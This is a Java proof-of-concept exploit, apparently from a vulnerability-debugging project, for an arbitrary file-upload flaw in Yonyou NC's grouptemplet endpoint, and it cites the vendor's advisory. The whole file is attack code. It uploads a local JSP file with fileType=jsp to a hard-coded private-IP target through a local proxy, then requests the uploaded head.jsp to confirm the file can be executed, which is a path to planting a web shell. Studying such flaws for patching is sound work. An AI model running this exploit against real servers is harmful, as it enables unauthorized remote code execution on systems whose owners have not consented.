package cve.nc;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;

import java.io.File;
import java.io.IOException;
import java.util.Random;

/**
 * 漏洞：
 * NC系统的grouptemplet文件上传漏洞
 * https://security.yonyou.com/#/noticeInfo?id=364
 */
public class grouptemplet_fileupload {

    public static void main(String[] args) throws IOException {

        int groupid = new Random().nextInt(1000000);

        String url = "http://10.58.120.201/uapim/upload/grouptemplet?groupid=" + groupid + "&fileType=jsp";
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);


        // TODO 修改文件路径
        String filePath = "D:\\javaProjects\\VulDebug\\Yongyou\\src\\main\\resources\\test.jsp";
        File file = new File(filePath);
        String fileName = file.getName();

        MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder.create()
                .addPart("file", new FileBody(file, ContentType.DEFAULT_BINARY, fileName))
                .addPart("description", new StringBody("File description", ContentType.TEXT_PLAIN));
        HttpEntity multipartEntity = multipartEntityBuilder.build();
        httpPost.setEntity(multipartEntity);
        httpRequest.exec(httpPost);

        String url2 = "http://10.58.120.201/uapim/static/pages/" + groupid + "/head.jsp";
        HttpGet httpGet = new HttpGet(url2);
        Response response = httpRequest.sendGet(httpGet);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());

    }
}
